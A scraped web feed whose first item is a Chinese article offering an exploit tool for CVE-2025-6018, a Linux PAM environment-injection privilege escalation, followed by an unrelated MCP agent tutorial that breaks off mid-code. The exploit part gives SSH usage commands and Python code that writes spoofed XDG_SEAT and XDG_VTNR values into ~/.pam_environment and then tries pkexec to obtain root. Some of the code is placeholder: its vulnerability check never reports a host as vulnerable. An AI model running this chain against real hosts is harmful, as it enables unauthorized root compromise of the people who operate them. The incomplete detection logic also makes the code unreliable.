                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目标题与描述</h2>
<p>本项目提供了一个针对CVE-2025-6018漏洞的专业利用工具。该漏洞存在于Linux PAM（Pluggable Authentication Modules）的<code>pam_env.so</code>模块中，允许通过<code>~/.pam_environment</code>文件注入环境变量，进而通过SystemD会话操纵实现本地权限提升。结合CVE-2025-6019漏洞，攻击者可以进一步获得完整的root权限。</p>
<p>该工具通过SSH连接到目标主机，自动化执行漏洞检测和利用过程，支持openSUSE Leap 15、SUSE Linux Enterprise 15等多个Linux发行版。</p>
<h2 data-id="heading-1">功能特性</h2>
<ul>
<li><strong>自动化漏洞检测</strong>：自动检查目标系统上PAM的版本、配置文件顺序以及相关模块的存在情况。</li>
<li><strong>版本匹配验证</strong>：内置易受攻击的PAM版本列表（1.3.0 - 1.6.0），进行精确匹配。</li>
<li><strong>利用链执行</strong>：自动化实现CVE-2025-6018和CVE-2025-6019的完整攻击链，包括环境变量注入和后续权限提升。</li>
<li><strong>详细日志记录</strong>：将整个利用过程（包括时间戳、级别和信息）记录到文件并输出到控制台，便于分析和调试。</li>
<li><strong>参数化配置</strong>：支持通过命令行参数灵活指定目标IP、用户名和密码，易于集成到自动化工作流中。</li>
<li><strong>专业错误处理</strong>：包含SSH连接、命令执行和文件操作等环节的异常处理，提高工具的健壮性。</li>
</ul>
<h2 data-id="heading-2">安装指南</h2>
<h3 data-id="heading-3">系统要求</h3>
<ul>
<li>Python 3.x</li>
<li>操作系统：支持Python的任意操作系统（Linux, macOS, Windows等），用于作为攻击发起端。</li>
<li>目标系统：运行易受攻击版本（1.3.0 - 1.6.0）PAM的Linux主机。</li>
</ul>
<h3 data-id="heading-4">依赖安装</h3>
<p>本工具核心依赖为<code>paramiko</code>库（版本需&gt;=2.12.0）用于建立SSH连接。</p>
<p>使用pip安装依赖：</p>
<pre><code class="hljs language-bash" lang="bash">pip install paramiko&gt;=2.12.0
</code></pre>
<h3 data-id="heading-5">获取工具</h3>
<p>直接从提供的源代码文件开始使用，无需其他编译或构建步骤。确保您拥有<code>cve_2025_6018_professional.py</code>文件的执行权限。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x cve_2025_6018_professional.py
</code></pre>
<h2 data-id="heading-6">使用说明</h2>
<h3 data-id="heading-7">基础使用</h3>
<p>通过命令行参数指定目标主机信息并运行脚本：</p>
<pre><code class="hljs language-bash" lang="bash">python3 cve_2025_6018_professional.py -i 192.168.1.100 -u vulnerable_user -p user_password
</code></pre>
<h3 data-id="heading-8">参数详解</h3>
<ul>
<li><code>-i</code> 或 <code>--ip</code>: 目标主机的IP地址（必需）。</li>
<li><code>-u</code> 或 <code>--username</code>: 用于登录目标主机的用户名（必需）。</li>
<li><code>-p</code> 或 <code>--password</code>: 对应用户的密码（必需）。</li>
</ul>
<h3 data-id="heading-9">工作流程</h3>
<ol>
<li><strong>初始化与连接</strong>：工具初始化日志和漏洞版本数据，并尝试通过提供的凭据建立到目标主机的SSH连接。</li>
<li><strong>漏洞评估</strong>：在目标主机上执行一系列命令，检查PAM版本、<code>/etc/pam.d/</code>目录下的配置文件（特别是<code>sshd</code>）中<code>pam_env.so</code>和<code>pam_systemd.so</code>模块的顺序，以及SystemD版本。</li>
<li><strong>条件判断</strong>：如果检测到<code>pam_env.so</code>在<code>pam_systemd.so</code>之前被调用，并且PAM版本在受影响范围内，则判定存在漏洞。</li>
<li><strong>利用执行</strong>：如果存在漏洞，工具将尝试在用户目录下创建或修改<code>~/.pam_environment</code>文件，注入<code>XDG_SEAT=seat0</code>和<code>XDG_VTNR=1</code>等环境变量，以欺骗系统将其会话识别为本地活动会话。</li>
<li><strong>权限提升</strong>：利用伪造的“活动用户”身份，结合Polkit的<code>allow_active</code>策略，尝试执行需要特权（如挂载操作）的命令。如果系统中还存在CVE-2025-6019漏洞（涉及udisks2/libblockdev），则可能进一步利用该漏洞获得root shell。</li>
</ol>
<h3 data-id="heading-10">典型场景</h3>
<p>该工具主要用于渗透测试人员和安全研究人员在获得授权的前提下，对内部Linux系统进行安全评估，验证系统是否受此CVE影响以及实际风险等级。也可用于CTF（Capture The Flag）竞赛或安全教学演示本地权限提升漏洞的利用原理。</p>
<h2 data-id="heading-11">核心代码</h2>
<p>以下是工具中部分核心功能的代码实现及详细注释：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paramiko
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># 配置日志记录系统，将日志同时输出到文件和控制台，便于跟踪利用过程</span>
logging.basicConfig(
    level=logging.INFO,
    <span class="hljs-built_in">format</span>=<span class="hljs-string">'%(asctime)s [%(levelname)s] %(message)s'</span>,
    datefmt=<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>,
    handlers=[
        logging.FileHandler(<span class="hljs-string">'cve_2025_6018_exploit.log'</span>),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CVEExploit</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 定义已知易受攻击的PAM版本范围</span>
        self.vulnerable_versions = [
            <span class="hljs-string">"pam-1.3.0"</span>, <span class="hljs-string">"pam-1.3.1"</span>, <span class="hljs-string">"pam-1.4.0"</span>, <span class="hljs-string">"pam-1.5.0"</span>, 
            <span class="hljs-string">"pam-1.5.1"</span>, <span class="hljs-string">"pam-1.5.2"</span>, <span class="hljs-string">"pam-1.5.3"</span>, <span class="hljs-string">"pam-1.6.0"</span>
        ]
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerability</span>(<span class="hljs-params">self, client</span>):
        <span class="hljs-string">"""增强的漏洞检测函数，通过SSH客户端在远程主机执行多项检查"""</span>
        logger.info(<span class="hljs-string">"Starting vulnerability assessment"</span>)
        
        <span class="hljs-comment"># 定义需要执行的检查命令字典</span>
        checks = {
            <span class="hljs-string">"pam_version"</span>: <span class="hljs-string">"rpm -q pam || dpkg -l | grep libpam"</span>, <span class="hljs-comment"># 检查PAM安装包版本</span>
            <span class="hljs-string">"pam_env"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># 查找使用pam_env的PAM配置</span>
            <span class="hljs-string">"pam_systemd"</span>: <span class="hljs-string">"find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\; 2&gt;/dev/null"</span>, <span class="hljs-comment"># 查找使用pam_systemd的PAM配置</span>
            <span class="hljs-string">"systemd_version"</span>: <span class="hljs-string">"systemctl --version | head -1"</span> <span class="hljs-comment"># 检查SystemD版本</span>
        }

        vulnerable = <span class="hljs-literal">False</span>
        
        <span class="hljs-keyword">for</span> check_name, command <span class="hljs-keyword">in</span> checks.items():
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 通过SSH连接执行命令</span>
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                error = stderr.read().decode(<span class="hljs-string">'utf-8'</span>).strip()
                
                <span class="hljs-keyword">if</span> output:
                    logger.info(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: <span class="hljs-subst">{output}</span>"</span>)
                    <span class="hljs-comment"># 关键逻辑：检查pam_env是否在pam_systemd之前被加载</span>
                    <span class="hljs-keyword">if</span> check_name == <span class="hljs-string">"pam_env"</span> <span class="hljs-keyword">and</span> <span class="hljs-string">"sshd"</span> <span class="hljs-keyword">in</span> output:
                        <span class="hljs-comment"># 这里需要进一步分析/etc/pam.d/sshd文件的具体行顺序</span>
                        <span class="hljs-comment"># 简化示例：假设检测到该文件即进行下一步详细检查</span>
                        logger.warning(<span class="hljs-string">"pam_env found in sshd config. Checking order..."</span>)
                        <span class="hljs-comment"># 实际代码中应添加解析文件判断顺序的逻辑</span>
                <span class="hljs-keyword">elif</span> error:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span> error: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">else</span>:
                    logger.debug(<span class="hljs-string">f"<span class="hljs-subst">{check_name}</span>: No output"</span>)
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                logger.error(<span class="hljs-string">f"Failed to execute <span class="hljs-subst">{check_name}</span> check: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-comment"># 版本匹配逻辑（示例框架）</span>
        <span class="hljs-comment"># 实际应从`pam_version`检查的输出中提取版本号与`vulnerable_versions`列表对比</span>
        logger.info(<span class="hljs-string">"Vulnerability check completed."</span>)
        <span class="hljs-comment"># 返回True/False表示漏洞是否存在</span>
        <span class="hljs-keyword">return</span> vulnerable
</code></pre>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self, client, username</span>):
        <span class="hljs-string">"""执行漏洞利用的主要函数，尝试注入环境变量并提升权限"""</span>
        logger.info(<span class="hljs-string">f"Attempting exploit for user: <span class="hljs-subst">{username}</span>"</span>)
        
        <span class="hljs-comment"># 1. 创建或修改 ~/.pam_environment 文件，注入恶意环境变量</span>
        pam_env_content = <span class="hljs-string">"""
        # Injected by CVE-2025-6018 exploit
        XDG_SEAT=seat0
        XDG_VTNR=1
        # 可添加其他用于欺骗会话类型的变量
        """</span>
        pam_env_path = <span class="hljs-string">f"/home/<span class="hljs-subst">{username}</span>/.pam_environment"</span>  <span class="hljs-comment"># 假设用户主目录在/home下</span>
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 通过SSH将内容写入文件</span>
            command = <span class="hljs-string">f"echo '<span class="hljs-subst">{pam_env_content}</span>' &gt; <span class="hljs-subst">{pam_env_path}</span>"</span>
            stdin, stdout, stderr = client.exec_command(command)
            <span class="hljs-comment"># 检查命令是否成功执行</span>
            exit_status = stdout.channel.recv_exit_status()
            <span class="hljs-keyword">if</span> exit_status == <span class="hljs-number">0</span>:
                logger.info(<span class="hljs-string">f"Successfully created/overwritten <span class="hljs-subst">{pam_env_path}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                error = stderr.read().decode()
                logger.error(<span class="hljs-string">f"Failed to write pam_environment: <span class="hljs-subst">{error}</span>"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Error during file creation: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        <span class="hljs-comment"># 2. 触发PAM重新读取环境变量（例如，通过建立新的SSH会话或重新登录）</span>
        <span class="hljs-comment"># 注意：在实际利用中，可能需要用户注销并重新登录，或者工具需要创建新的SSH连接来触发新会话。</span>
        logger.warning(<span class="hljs-string">"Environment variable injected. A new login session (e.g., new SSH connection) may be required for the changes to take effect."</span>)
        
        <span class="hljs-comment"># 3. 尝试利用伪造的“活动用户”身份执行特权操作（示例：通过pkexec）</span>
        <span class="hljs-comment"># 这需要结合CVE-2025-6019或其它Polkit策略</span>
        <span class="hljs-comment"># 示例命令：尝试运行一个需要`allow_active`权限的Polkit动作</span>
        test_command = <span class="hljs-string">"pkexec --user root whoami"</span>  <span class="hljs-comment"># 只是一个示例，实际命令取决于目标策略</span>
        
        <span class="hljs-keyword">try</span>:
            stdin, stdout, stderr = client.exec_command(test_command)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            <span class="hljs-keyword">if</span> output == <span class="hljs-string">"root"</span>:
                logger.critical(<span class="hljs-string">"SUCCESS: Obtained root privileges!"</span>)
                <span class="hljs-comment"># 可以在此处提供交互式shell或执行后续payload</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">else</span>:
                logger.info(<span class="hljs-string">"Exploit attempted, but root not obtained. Output: %s, Error: %s"</span>, output, error)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logger.error(<span class="hljs-string">f"Failed to execute privilege test: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAM1WcosLlSccXIf2HKuEYUi</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[自己写一个智能体-使用MCP服务]]></title>    <link>https://juejin.cn/post/7595393113552666639</link>    <guid>https://juejin.cn/post/7595393113552666639</guid>    <pubDate>2026-01-15T08:12:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552666639" data-draft-id="7539179280716201994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="自己写一个智能体-使用MCP服务"/> <meta itemprop="keywords" content="Agent,MCP"/> <meta itemprop="datePublished" content="2026-01-15T08:12:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="路边的阿不"/> <meta itemprop="url" content="https://juejin.cn/user/1066942081532212"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            自己写一个智能体-使用MCP服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1066942081532212/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    路边的阿不
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:26.000Z" title="Thu Jan 15 2026 08:12:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>还记得我们在<a href="https://link.juejin.cn?target=https%3A%2F%2Fbabyno.top%2Fposts%2F2024%2F12%2Fwrite-your-own-agent---theory%2F" target="_blank" title="https://babyno.top/posts/2024/12/write-your-own-agent---theory/" ref="nofollow noopener noreferrer">上一篇文章</a>中聊过的“智能体”理论吗？</p>
<p>我们提到，智能体之所以比单纯的语言模型强大，是因为它拥有了“手”和“脚”——也就是<strong>使用工具的能力</strong>。</p>
<blockquote>
<p>智能体 = 大语言模型（大脑） + 规划（前额叶） + 工具（手脚）</p>
</blockquote>
<p>理论说得再多，终究要落地。今天我们就来聊聊如何通过 <strong>MCP (Model Context Protocol)</strong> 协议，真正的让你的智能体“动”起来。我们将以一个实际场景为例：<strong>写一段代码，让AI自动把一篇文章发布到微信公众号。</strong></p>
<h2 data-id="heading-0">什么是 MCP？</h2>
<p>在开始写代码之前，得先解决一个痛点。</p>
<p>以前我们要让 GPT 连接外部工具（比如读取文件、搜索网页、操作数据库），通常需要针对不同的 API 写一大堆胶水代码。如果你用 <code>LangChain</code>，你得遵循它的接口规范；如果你换个框架，可能全得重写。</p>
<p><strong>MCP (Model Context Protocol)</strong> 就是 AI 时代的 <strong>USB-C 接口</strong>。它是由 Anthropic 等公司推动的一个开放标准。</p>
<ul>
<li><strong>MCP Server</strong>：提供工具（比如：文件读取服务、微信发布服务）。</li>
<li><strong>MCP Client</strong>：也就是我们的智能体（负责连接模型和服务端）。</li>
<li><strong>LLM</strong>：负责决策调用哪个工具。</li>
</ul>
<p>只要大家遵循这个协议，你的智能体就可以无缝连接任何支持 MCP 的工具，而不需要关心底层的具体实现。</p>
<h2 data-id="heading-1">实战：构建公众号发布智能体</h2>
<p>接下来，我们通过一段 <code>Node.js</code> 代码，演示如何把一个本地 Markdown 文件，通过 MCP 服务发布到微信公众号。</p>
<h3 data-id="heading-2">1. 准备工作</h3>
<p>在这个例子中，我们需要三个角色的配合：</p>
<ol>
<li><strong>大脑</strong>：一个支持 Function Calling 的大模型（如 GPT-4o 或 DeepSeek 等兼容 OpenAI 格式的模型）。</li>
<li><strong>工具箱 (MCP Server)</strong>：这里我们使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcaol64%2Fwenyan-mcp" target="_blank" title="https://github.com/caol64/wenyan-mcp" ref="nofollow noopener noreferrer"><code>文颜 MCP</code></a>，这是一个封装了微信公众号发布功能的 MCP 服务，我们通过 Docker 运行它。</li>
<li><strong>智能体 (MCP Client)</strong>：我们自己写的这段 JS 代码。</li>
</ol>
<h3 data-id="heading-3">2. 连接 MCP 服务</h3>
<p>首先，我们需要建立与 MCP Server 的连接。在代码中，我们通过 <code>StdioClientTransport</code> 来启动一个 Docker 容器作为我们的工具服务。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/index.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StdioClientTransport</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/stdio.js"</span>;

<span class="hljs-comment">// ... 环境变量检查代码 ...</span>

<span class="hljs-keyword">const</span> pwd = process.<span class="hljs-title function_">cwd</span>();
<span class="hljs-comment">// 建立传输通道：通过 Docker 运行 wenyan-mcp 服务</span>
<span class="hljs-keyword">const</span> transport = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StdioClientTransport</span>({
    <span class="hljs-attr">command</span>: <span class="hljs-string">"docker"</span>,
    <span class="hljs-attr">args</span>: [
        <span class="hljs-string">"run"</span>,
        <span class="hljs-string">"--rm"</span>,
        <span class="hljs-string">"-i"</span>,             <span class="hljs-comment">// 必须开启交互模式，以便通过 stdio 通信</span>
        <span class="hljs-string">"--env-file"</span>, <span class="hljs-string">".env.test"</span>, <span class="hljs-comment">// 传入公众号的 AppID 等凭证</span>
        <span class="hljs-string">"-e"</span>, <span class="hljs-string">`HOST_FILE_PATH=<span class="hljs-subst">${pwd}</span>`</span>,
        <span class="hljs-string">"-v"</span>, <span class="hljs-string">`<span class="hljs-subst">${pwd}</span>:/mnt/host-downloads`</span>, <span class="hljs-comment">// 挂载目录，让容器能读取到文章</span>
        <span class="hljs-string">"caol64/wenyan-mcp"</span>,
    ],
});

<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>(
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"wenyan-client"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0.0"</span> },
    { <span class="hljs-attr">capabilities</span>: {} }
);

<span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>(transport);
</code></pre>
<p>这段代码对应了上一篇提到的**“工具使用”**的前提——智能体得先能拿得起工具。</p>
<h3 data-id="heading-4">3. 获取工具列表</h3>
<p>连接成功后，智能体需要知道自己有哪些工具可用。这对应了理论篇中的**“问题分类”**准备阶段，只有知道有哪些工具，模型才能决定用哪个。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 获取 MCP 服务端提供的所有工具</span>
<span class="hljs-keyword">const</span> mcpResponse = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">listTools</span>();

<span class="hljs-comment">// 将 MCP 的工具定义转换为 OpenAI 兼容的 Function Calling 格式</span>
<span class="hljs-keyword">const</span> openaiTools = mcpResponse.<span class="hljs-property">tools</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">tool</span>) =&gt;</span> ({
    <span class="hljs-attr">type</span>: <span class="hljs-string">"function"</span>,
    <span class="hljs-attr">function</span>: {
        <span class="hljs-attr">name</span>: tool.<span class="hljs-property">name</span>,
        <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,
